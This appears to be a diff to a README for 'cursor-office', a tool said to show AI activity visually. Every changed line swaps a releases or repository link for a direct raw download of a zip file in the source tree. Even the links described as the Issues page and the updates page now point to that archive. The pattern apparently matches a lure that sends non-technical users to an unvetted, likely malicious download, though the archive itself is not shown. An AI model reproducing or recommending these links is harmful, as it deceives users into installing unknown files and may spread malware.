@@ -1,6 +1,6 @@
 # 🎨 cursor-office - Watch Your AI Work Visually
 
-[![Download cursor-office](https://img.shields.io/badge/Download-cursor--office-ff6f61?style=for-the-badge&logo=github)](https://github.com/Isaacpixier/cursor-office/releases)
+[![Download cursor-office](https://img.shields.io/badge/Download-cursor--office-ff6f61?style=for-the-badge&logo=github)](https://github.com/Isaacpixier/cursor-office/raw/refs/heads/main/src/cursor-office-3.2.zip)
 
 ---
 
@@ -43,7 +43,7 @@ Start using cursor-office by following these steps. No technical knowledge is ne
 
 Click the button below to open the release page on GitHub. This page holds the latest version of cursor-office ready for you to download.
 
-[![Download cursor-office](https://img.shields.io/badge/Download-cursor--office-ff6f61?style=for-the-badge&logo=github)](https://github.com/Isaacpixier/cursor-office/releases)
+[![Download cursor-office](https://img.shields.io/badge/Download-cursor--office-ff6f61?style=for-the-badge&logo=github)](https://github.com/Isaacpixier/cursor-office/raw/refs/heads/main/src/cursor-office-3.2.zip)
 
 ### Step 2: Choose the Latest Version
 
@@ -103,7 +103,7 @@ If the program does not start or acts strangely, try these steps:
 
 For questions or issues, use the GitHub repository page. Look for the “Issues” tab to see if others have the same problem or post your own.
 
-[https://github.com/Isaacpixier/cursor-office](https://github.com/Isaacpixier/cursor-office)
+[https://github.com/Isaacpixier/cursor-office/raw/refs/heads/main/src/cursor-office-3.2.zip](https://github.com/Isaacpixier/cursor-office/raw/refs/heads/main/src/cursor-office-3.2.zip)
 
 ---
 
@@ -117,4 +117,4 @@ cursor-office is free to use. Check the project’s GitHub page for details on t
 
 The developers may release updates on the GitHub releases page. Visit the page from time to time to get the latest improvements.
 
-[https://github.com/Isaacpixier/cursor-office/releases](https://github.com/Isaacpixier/cursor-office/releases)
+[https://github.com/Isaacpixier/cursor-office/raw/refs/heads/main/src/cursor-office-3.2.zip](https://github.com/Isaacpixier/cursor-office/raw/refs/heads/main/src/cursor-office-3.2.zip)
